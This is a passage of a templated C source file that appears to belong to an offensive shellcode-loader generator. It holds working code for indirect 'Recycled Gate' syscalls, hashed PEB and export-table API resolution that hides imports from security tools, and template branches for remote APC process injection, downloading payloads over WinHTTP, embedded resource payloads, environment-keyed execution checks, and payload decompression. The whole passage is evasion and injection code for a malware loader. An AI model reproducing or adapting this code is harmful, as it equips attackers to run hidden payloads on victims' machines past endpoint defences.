    if (status >= 0) return 1;
    return 0;
}

BOOL WINAPI RG_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, PSIZE_T lpNumberOfBytesWritten) {
    InitSyscall({{ hash_rg_ntwritevirtualmemory }}, &g_NtWriteVirtualMemory);
    if (!g_NtWriteVirtualMemory.pRecycledGate) return FALSE;
    
    SIZE_T bytesWritten = 0;
    
    PrepareSyscall(g_NtWriteVirtualMemory.dwSyscallNr, g_NtWriteVirtualMemory.pRecycledGate);
    NTSTATUS status = DoSyscall(
        hProcess,
        lpBaseAddress,
        (PVOID)lpBuffer,
        nSize,
        &bytesWritten
    );
    
    if (lpNumberOfBytesWritten) *lpNumberOfBytesWritten = bytesWritten;
    
    return (status >= 0);
}

// --- Standard Resolver Helpers ---
DWORD RG_HashString(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++)) { hash = ((hash << 5) + hash) + c; }
    return hash;
}

HMODULE RG_GetModuleHandleByHash(DWORD dwModuleNameHash) {
    if (dwModuleNameHash == 0) return NULL;
    PRG_PEB pPeb = (PRG_PEB)(__readgsqword(0x60));
    PRG_PEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY listHead = &(pLdr->InMemoryOrderModuleList);
    PLIST_ENTRY currentEntry = listHead->Flink;
    while (currentEntry != listHead) {
        PRG_LDR_DATA_TABLE_ENTRY pDte = CONTAINING_RECORD(currentEntry, RG_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pDte->FullDllName.Length > 0) {
             char upperDllName[MAX_PATH];
            DWORD i = 0;
            while (pDte->FullDllName.Buffer[i] && i < MAX_PATH - 1) {
                char c = (char)pDte->FullDllName.Buffer[i];
                if (c >= 'a' && c <= 'z') { upperDllName[i] = c - 32; } 
                else { upperDllName[i] = c; }
                i++;
            }
            upperDllName[i] = '\0';
            char* last_slash = strrchr(upperDllName, '\\');
            char* module_name = last_slash ? last_slash + 1 : upperDllName;
            if (RG_HashString(module_name) == dwModuleNameHash) {
                return (HMODULE)pDte->DllBase;
            }
        }
        currentEntry = currentEntry->Flink;
    }
    return NULL;
}

FARPROC RG_GetProcAddressByHash(HMODULE hModule, DWORD dwApiNameHash) {
    if (hModule == NULL || dwApiNameHash == 0) return NULL;
    PBYTE pBase = (PBYTE)hModule;
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pImgExportDir->NumberOfNames; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        if (dwApiNameHash == RG_HashString(pFunctionName)) {
            return (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
        }
    }
    return NULL;
}


void ResolveAPIs() {
    DWORD KERNEL32_HASH = {{ hash_kernel32_dll }};
    HMODULE hKernel32 = RG_GetModuleHandleByHash(KERNEL32_HASH);
    
    pfnLoadLibraryA = (pLoadLibraryA)RG_GetProcAddressByHash(hKernel32, {{ hash_loadlibrarya }});
    pfnGetProcessHeap = (pGetProcessHeap)RG_GetProcAddressByHash(hKernel32, {{ hash_getprocessheap }});
    pfnCreateFileA = (pCreateFileA)RG_GetProcAddressByHash(hKernel32, {{ hash_createfilea }});
    pfnGetFileSize = (pGetFileSize)RG_GetProcAddressByHash(hKernel32, {{ hash_getfilesize }});
    pfnReadFile = (pReadFile)RG_GetProcAddressByHash(hKernel32, {{ hash_readfile }});
    pfnSleepEx = (pSleepEx)RG_GetProcAddressByHash(hKernel32, {{ hash_sleepex }});
    
    pfnVirtualAlloc = (pVirtualAlloc)RG_VirtualAlloc;
    pfnCreateThread = (pCreateThread)RG_CreateThread;
    pfnWaitForSingleObject = (pWaitForSingleObject)RG_WaitForSingleObject;
    pfnCloseHandle = (pCloseHandle)RG_CloseHandle;
    
    pfnCreateFileMappingW = (pCreateFileMappingW)RG_CreateFileMappingW;
    pfnMapViewOfFile = (pMapViewOfFile)RG_MapViewOfFile;
    
    pfnNtCreateSection = (pNtCreateSection)RG_NtCreateSection;
    pfnNtMapViewOfSection = (pNtMapViewOfSection)RG_NtMapViewOfSection;
    
    {% if execution_method == 'remoteapc' %}
    pfnQueueUserAPC = (pQueueUserAPC)RG_QueueUserAPC;
    pfnWriteProcessMemory = (pWriteProcessMemory)RG_WriteProcessMemory;
    
    pfnCreateProcessA = (pCreateProcessA)RG_GetProcAddressByHash(hKernel32, {{ hash_createprocessa }});
    pfnVirtualAllocEx = (pVirtualAllocEx)RG_GetProcAddressByHash(hKernel32, {{ hash_virtualallocex }});
    pfnVirtualProtectEx = (pVirtualProtectEx)RG_GetProcAddressByHash(hKernel32, {{ hash_virtualprotectex }});
    pfnResumeThread = (pResumeThread)RG_GetProcAddressByHash(hKernel32, {{ hash_resumethread }});
    
    pfnGetLastError = (pGetLastError)RG_GetProcAddressByHash(hKernel32, {{ hash_getlasterror }});
    
    // RemoteAPC also uses NtCreateJobObject and others which are not wrapped here yet. 
    // We should resolve them from NTDLL.
    // For now, let's resolve them using standard GetProcAddress (via hash) to avoid crashes.
    // Wait, we need hNtdll for these.
    {% endif %} 
    
    {% if data_source == 'http' %}
    DWORD WINHTTP_HASH = {{ hash_winhttp_dll }};
    HMODULE hWinHttp = RG_GetModuleHandleByHash(WINHTTP_HASH);
    if (hWinHttp == NULL && pfnLoadLibraryA != NULL) { hWinHttp = pfnLoadLibraryA("winhttp.dll"); }
    if (hWinHttp != NULL) {
        pfnWinHttpOpen = (pWinHttpOpen)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpopen }});
        pfnWinHttpConnect = (pWinHttpConnect)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpconnect }});
        pfnWinHttpOpenRequest = (pWinHttpOpenRequest)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpopenrequest }});
        pfnWinHttpSendRequest = (pWinHttpSendRequest)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpsendrequest }});
        pfnWinHttpReceiveResponse = (pWinHttpReceiveResponse)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpreceiveresponse }});
        pfnWinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpquerydataavailable }});
        pfnWinHttpReadData = (pWinHttpReadData)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpreaddata }});
        pfnWinHttpCloseHandle = (pWinHttpCloseHandle)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpclosehandle }});
        pfnWinHttpCrackUrl = (pWinHttpCrackUrl)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpcrackurl }});
        pfnWinHttpSetOption = (pWinHttpSetOption)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpsetoption }});
        pfnWinHttpQueryHeaders = (pWinHttpQueryHeaders)RG_GetProcAddressByHash(hWinHttp, {{ hash_winhttpqueryheaders }});
    }
    {% endif %}

    DWORD NTDLL_HASH = {{ hash_ntdll_dll }};
    HMODULE hNtdll = RG_GetModuleHandleByHash(NTDLL_HASH);
    pfnHeapAlloc = (pHeapAlloc)RG_GetProcAddressByHash(hNtdll, {{ hash_rtlallocateheap }});
    pfnHeapFree = (pHeapFree)RG_GetProcAddressByHash(hKernel32, {{ hash_heapfree }});
    
    if (hNtdll != NULL) {
        pfnRtlMoveMemory = (pRtlMoveMemory)RG_GetProcAddressByHash(hNtdll, {{ hash_rtlmovememory }});
        pfnRtlZeroMemory = (pRtlZeroMemory)RG_GetProcAddressByHash(hNtdll, {{ hash_rtlzeromemory }});
        
        {% if execution_method == 'remoteapc' %}
        pfnNtCreateJobObject = (pNtCreateJobObject)RG_GetProcAddressByHash(hNtdll, {{ hash_ntcreatejobobject }});
        pfnNtSetInformationJobObject = (pNtSetInformationJobObject)RG_GetProcAddressByHash(hNtdll, {{ hash_ntsetinformationjobobject }});
        pfnNtAssignProcessToJobObject = (pNtAssignProcessToJobObject)RG_GetProcAddressByHash(hNtdll, {{ hash_ntassignprocesstojobobject }});
        {% endif %}
    }
    
    {% if data_source == 'embedded' %}
    pfnFindResourceA = (pFindResourceA)RG_GetProcAddressByHash(hKernel32, {{ hash_findresourcea }});
    pfnLoadResource = (pLoadResource)RG_GetProcAddressByHash(hKernel32, {{ hash_loadresource }});
    pfnLockResource = (pLockResource)RG_GetProcAddressByHash(hKernel32, {{ hash_lockresource }});
    pfnSizeofResource = (pSizeofResource)RG_GetProcAddressByHash(hKernel32, {{ hash_sizeofresource }});
    {% endif %} 
    
    {% if guardrails_needed %}
    pfnGetComputerNameA = (pGetComputerNameA)RG_GetProcAddressByHash(hKernel32, {{ hash_getcomputernamea }});
    pfnLstrlenA = (pLstrlenA)RG_GetProcAddressByHash(hKernel32, {{ hash_lstrlena }});
    pfnGetEnvironmentVariableA = (pGetEnvironmentVariableA)RG_GetProcAddressByHash(hKernel32, {{ hash_getenvironmentvariablea }});
    
    DWORD ADVAPI32_HASH = {{ hash_advapi32_dll }};
    HMODULE hAdvApi32 = RG_GetModuleHandleByHash(ADVAPI32_HASH);
    if (hAdvApi32 == NULL && pfnLoadLibraryA != NULL) { 
        hAdvApi32 = pfnLoadLibraryA("advapi32.dll"); 
    }
    if (hAdvApi32 != NULL) {
        pfnLsaOpenPolicy = (pLsaOpenPolicy)RG_GetProcAddressByHash(hAdvApi32, {{ hash_lsaopenpolicy }});
        pfnLsaQueryInformationPolicy = (pLsaQueryInformationPolicy)RG_GetProcAddressByHash(hAdvApi32, {{ hash_lsaqueryinformationpolicy }});
        pfnLsaFreeMemory = (pLsaFreeMemory)RG_GetProcAddressByHash(hAdvApi32, {{ hash_lsafreememory }});
        pfnLsaClose = (pLsaClose)RG_GetProcAddressByHash(hAdvApi32, {{ hash_lsaclose }});
    }
    {% endif %} 
    
    {% if bytecode_compression == 'mszip_compressor' %}
    DWORD CABINET_HASH = {{ hash_cabinet_dll }};
    HMODULE hCabinet = RG_GetModuleHandleByHash(CABINET_HASH);
    if (hCabinet == NULL && pfnLoadLibraryA != NULL) hCabinet = pfnLoadLibraryA("cabinet.dll");
    if (hCabinet) {
         pfnCreateDecompressor = (pCreateDecompressor)RG_GetProcAddressByHash(hCabinet, {{ hash_createdecompressor }});
         pfnDecompress = (pDecompress)RG_GetProcAddressByHash(hCabinet, {{ hash_decompress }});
         pfnCloseDecompressor = (pCloseDecompressor)RG_GetProcAddressByHash(hCabinet, {{ hash_closedecompressor }});
    }
    {% endif %}

    DEBUG_PRINT("API functions resolved with Recycled Gate.");
}
